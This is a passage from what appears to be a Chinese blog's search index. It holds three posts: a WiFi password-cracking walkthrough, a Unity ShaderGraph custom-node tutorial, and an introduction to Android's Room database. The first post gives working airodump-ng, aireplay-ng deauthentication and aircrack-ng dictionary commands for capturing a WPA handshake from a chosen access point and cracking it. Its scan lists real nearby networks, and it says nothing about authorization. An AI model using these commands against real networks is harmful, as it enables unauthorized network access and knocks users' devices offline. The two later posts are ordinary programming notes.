    <content><![CDATA[<p>1、<code>airport -s</code>查看周围可用的wifi<br><figure class="highlight d"><table><tr><td class="code"><pre><span class="line">SSID          BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)</span><br><span class="line">@<span class="number">708_</span>SR_5G    d8:c8:e9:<span class="number">90</span>:a5:f8 -<span class="number">31</span>  <span class="number">149</span>,+<span class="number">1</span>  Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)</span><br><span class="line">HUAWEI-dot    b0:e1:<span class="number">7</span>e:a3:ce:<span class="number">88</span> -<span class="number">72</span>  <span class="number">1</span>,+<span class="number">1</span>    Y  -- WPA2(PSK/AES/AES)</span><br><span class="line">TP-LINK_1B9B  <span class="number">34</span>:<span class="number">96</span>:<span class="number">72</span>:<span class="number">72</span>:<span class="number">1</span>b:<span class="number">9</span>b -<span class="number">90</span>  <span class="number">1</span>,+<span class="number">1</span>    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line">zerozero8     <span class="number">1</span>c:<span class="number">60</span>:de:<span class="number">17</span>:a3:<span class="number">52</span> -<span class="number">72</span>  <span class="number">13</span>,-<span class="number">1</span>   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line">newifi_83CC   <span class="number">20</span>:<span class="number">76</span>:<span class="number">93</span>:<span class="number">2</span>f:<span class="number">83</span>:cc -<span class="number">87</span>  <span class="number">10</span>      Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line">@<span class="number">708_</span>SR_2.4G  d8:c8:e9:<span class="number">90</span>:a5:f0 -<span class="number">16</span>  <span class="number">6</span>       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)</span><br><span class="line"><span class="number">708</span>           <span class="number">0</span>8:<span class="number">10</span>:<span class="number">76</span>:<span class="number">68</span>:eb:d2 -<span class="number">62</span>  <span class="number">6</span>,+<span class="number">1</span>    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br></pre></td></tr></table></figure></p>
<p>sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport sniff 11<br>aircrack-ng -a 1 -b 50:64:2b:02:21:c8 /private/tmp/airport*.cap</p>
<p>2、选好目标开始抓取握手包<br><code>airodump-ng -c {CHANNEL} --bssid {BSSID} -w {握手包存放位置}</code><br>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 8 --bssid 1c:60:de:17:a3:52 -w ~/Desktop/hands/</span><br></pre></td></tr></table></figure></p>
<p>3、开始抓包之后让某台设备(设备的mac地址从上一步STATION来)强制掉线(强制掉线的目的是让该设备重新去连接路由器，从而抓取成功的握手)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// -0 death模式</span><br><span class="line">// 20 攻击次数 0为一直攻击</span><br><span class="line"></span><br><span class="line">aireplay-ng -0 20 -c &#123;MAC地址&#125; -a &#123;BSSID&#125; wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>4、使用字典开始破解<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w ~/hack/zidian.txt ~/Desktop/hands/*.cap</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>shader_nodes</title>
    <url>/2018/11/09/shader-nodes/</url>
    <content><![CDATA[<p>Unity自从推出ShaderGraph以来。</p>
<p>编写一个自定义的节点很简单，跟拓展编辑器一样，将代码放到Editor目录下就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using UnityEditor.ShaderGraph;</span><br><span class="line">using System.Reflection;</span><br><span class="line"></span><br><span class="line">[Title(&quot;节点分组&quot;, &quot;节点名称&quot;)]</span><br><span class="line">public class XXXNode : CodeFunctionNode&#123;</span><br><span class="line"></span><br><span class="line">  // 必须覆写此方法，考苏编辑器应该调用哪个方法</span><br><span class="line">  // 自定义的方法名称为 DoMyCustomFunction</span><br><span class="line">  protected override MethodInfo GetFunctionToConvert()&#123;</span><br><span class="line">      return GetType().GetMethod(&quot;DoMyCustomFunction&quot;,</span><br><span class="line">              BindingFlags.Static | BindingFlags.NonPublic);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 编辑器调用的方法，这个方法定义出输入和输出</span><br><span class="line">  // 支持的输入和输出类型见下表</span><br><span class="line">  private static void DoMyCustomFunction(</span><br><span class="line">    //Slot 定义一个插槽</span><br><span class="line">    //Binding.None 表示没有指定希望得到的类型</span><br><span class="line">    //DynamicDimensionVector</span><br><span class="line">    //out表示输出类型</span><br><span class="line">    //A,B,Out会显示在界面上</span><br><span class="line">    [Slot(0, Binding.None)] DynamicDimensionVector A,</span><br><span class="line">		[Slot(1, Binding.None)] DynamicDimensionVector B,</span><br><span class="line">		[Slot(2, Binding.None)] out DynamicDimensionVector Out</span><br><span class="line">    )&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为Unity对原生的shader进行了封装来方便获取shader中的值，所以便有了插槽和绑定的概念。<br>所以，插槽就是告诉编辑器：<br>“喂，这里定义了一个参数。”<br>“好的，什么类型的？”<br>”Binding指定的类型”<br>“好的，您指定的是Binding.None，默认按照defaultValue处理了。”</p>
<ul>
<li>插槽<br>用Slot关键字声明一个插槽，语法如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//0 slotId 唯一值 表示参数的索引</span><br><span class="line">//Binding.MeshUV0 binding 表示插槽中放的参数的类型</span><br><span class="line">//false hidden 插槽是否隐藏 默认为false</span><br><span class="line">Slot(0, Binding.MeshUV0,false)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>ObjectSpaceNormal</td>
<td>A</td>
</tr>
<tr>
<td>ObjectSpaceTangent</td>
<td>A</td>
</tr>
<tr>
<td>ObjectSpaceBitangent</td>
<td>A</td>
</tr>
<tr>
<td>ObjectSpacePosition</td>
<td>A</td>
</tr>
<tr>
<td>ViewSpaceNormal</td>
<td>A</td>
</tr>
<tr>
<td>ViewSpaceTangent</td>
<td>A</td>
</tr>
<tr>
<td>ViewSpaceBitangent</td>
<td>A</td>
</tr>
<tr>
<td>ViewSpacePosition</td>
<td>A</td>
</tr>
<tr>
<td>WorldSpaceNormal</td>
<td>A</td>
</tr>
<tr>
<td>WorldSpaceTangent</td>
<td>A</td>
</tr>
<tr>
<td>WorldSpaceBitangent</td>
<td>A</td>
</tr>
<tr>
<td>WorldSpacePosition</td>
<td>A</td>
</tr>
<tr>
<td>TangentSpaceNormal</td>
<td>A</td>
</tr>
<tr>
<td>TangentSpaceTangent</td>
<td>A</td>
</tr>
<tr>
<td>TangentSpaceBitangent</td>
<td>A</td>
</tr>
<tr>
<td>TangentSpacePosition</td>
<td>A</td>
</tr>
<tr>
<td>ObjectSpaceViewDirection</td>
<td>视角方向 – 以自身为标准</td>
</tr>
<tr>
<td>ViewSpaceViewDirection</td>
<td>视角方向 – 以世界为标准</td>
</tr>
<tr>
<td>WorldSpaceViewDirection</td>
<td>视角方向 – 在世界空间中</td>
</tr>
<tr>
<td>TangentSpaceViewDirection</td>
<td>视角方向 – 在</td>
</tr>
<tr>
<td>MeshUV0</td>
<td>UI 通道0</td>
</tr>
<tr>
<td>MeshUV1</td>
<td>UI 通道1</td>
</tr>
<tr>
<td>MeshUV2</td>
<td>UI 通道2</td>
</tr>
<tr>
<td>MeshUV3</td>
<td>UI 通道3</td>
</tr>
<tr>
<td>ScreenPosition</td>
<td>在屏幕中的位置</td>
</tr>
<tr>
<td>VertexColor</td>
<td>顶点颜色</td>
</tr>
</tbody>
</table>
<p>参考链接：<br><a href="https://blogs.unity3d.com/cn/2018/03/27/shader-graph-custom-node-api-using-the-code-function-node/" target="_blank" rel="noopener">https://blogs.unity3d.com/cn/2018/03/27/shader-graph-custom-node-api-using-the-code-function-node/</a><br><a href="https://github.com/Unity-Technologies/ShaderGraph/wiki/CodeFunctionNode" target="_blank" rel="noopener">https://github.com/Unity-Technologies/ShaderGraph/wiki/CodeFunctionNode</a></p>
<p><br><br><br><br><br><br><br><br><br></p>
]]></content>
      <tags>
        <tag>Unity3D</tag>
        <tag>Shader</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Room 数据库访问</title>
    <url>/2018/09/08/room/</url>
    <content><![CDATA[<p>Android的数据持久化，大家一般常用SharedPreference和数据库，其中数据库又有多种的用法。本人使用过sqlite和realm数据库，其中greendao(对sqlite的封装)个人感觉已经满足绝大部分使用场景了。后来谷歌专门对sqlite进行了封装，命名为room，个人感觉使用方法跟realm是一样的，连名字都是那么像。相对于relam，room是基于sqlite的，所以不需要多余so，apk的体积会减少，且sqlite已经比较稳定。</p>
<p>谷歌对room提供了rxjava和测试支持，可以从google的<a href="https://dl.google.com/dl/android/maven2/index.html" target="_blank" rel="noopener">maven地址</a>中看到,目前的最新版本是1.1.1：</p>
<p><img src="room_maven_version.jpg" width="50%" height="50%"><br><!-- ![img-w100](room/room_maven_version.jpg) --></p>
<p>Room中的Entity表示一张表，创建一个类使用@Entity注解后，此类在编译的时候会被注册为一个表，数据库初始化的时候创建。</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Room</tag>
      </tags>
  </entry>
</search>
